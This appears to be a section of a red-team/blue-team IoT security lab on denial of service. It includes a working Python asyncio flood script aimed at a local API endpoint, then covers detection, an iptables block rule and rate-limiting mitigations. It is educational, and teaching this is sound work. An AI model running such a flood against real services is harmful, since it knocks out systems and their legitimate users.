# Part D: Denial of Service (DoS)

## Objective
IoT servers often possess constrained computational resources and database connection pools. Your goal is to **flood** the API with an overwhelming volume of requests, preventing legitimate sensors from reporting their telemetry data and crippling the Blue Team Dashboard.

> [!WARNING]
> **Real-World Scenario:** Asymmetric DoS attacks don't necessarily require massive botnets like Mirai. If an attacker identifies an API endpoint that performs expensive cryptographic operations or slow database queries, a single laptop can cripple a robust server (an application-layer or Layer 7 DoS).

---

## 🔴 Red Team Instructions (Offense)

### 1. Reconnaissance
- **Action:** Observe the legitimate traffic from `rpi_simulator/sensor.js`.
- **Target:** `POST /api/data`
- **Current State:** The server processes every request synchronously, opening a new database connection or awaiting an I/O operation without limiting the concurrency from a single source IP.

### 2. Weaponization
You need a script capable of asynchronous or multi-threaded execution to maximize throughput. Node.js or Python `asyncio` are excellent choices.

- **Action:** Create a fast flood script.
- **Example Payload (Python):**
  ```python
  import aiohttp
  import asyncio

  async def attack(session):
      url = "http://localhost:3000/api/data"
      payload = {"deviceId": "bot-99", "temp": 50, "humidity": 10}
      while True:
          try:
              await session.post(url, json=payload)
          except Exception:
              pass

  async def main():
      async with aiohttp.ClientSession() as session:
          tasks = [attack(session) for _ in range(100)] # 100 concurrent connections
          await asyncio.gather(*tasks)

  asyncio.run(main())
  ```

### 3. The Attack & Success Condition
Run the flood script. 
1. The terminal running the Node.js server will likely start throwing generic errors or slow to a crawl.
2. The legitimate `sensor.js` script will begin outputting `ECONNREFUSED` or timeout errors.
3. The Blue Team Dashboard will stop updating or crash entirely as the WebSocket connections fail.

---

## 🔵 Blue Team Instructions (Defense)

### 1. Detection
- **Action:** Utilize a monitoring tool (like the automated `monitor.js` or a rudimentary `htop` command on the server).
- **Indicator of Compromise (IoC):** A massive, sustained spike in CPU/Memory usage and thousands of requests originating from a single IP address that does not match the known sensor inventory.

### 2. Mitigation Strategy
A comprehensive defense requires logic at both the application and infrastructure layers.

- **Action 1: IP Blocking (The Blunt Instrument)**
  Use the OS firewall (`iptables` or `ufw` on Linux) to drop traffic from the attacker's IP entirely before it ever hits the Node.js event loop.
  ```bash
  sudo iptables -A INPUT -s [ATTACKER_IP] -j DROP
  ```

- **Action 2: Application-Layer Throttling (The Scalpel)**
  Implement a dynamic rate limit specifically for the `/api/data` endpoint if IP blocking isn't feasible (e.g., behind a shared NAT).

- **Action 3: Connection Pool Management**
  Ensure your MongoDB connection specifies a `maxPoolSize` so an influx of requests doesn't exhaust the database's available connections, causing a cascading failure.

### 3. Verification
After implementing mitigation, the attacker's script will either hang indefinitely (dropped packets) or receive continuous `429 Too Many Requests` HTTP errors, while the legitimate sensor traffic resumes normal operation.
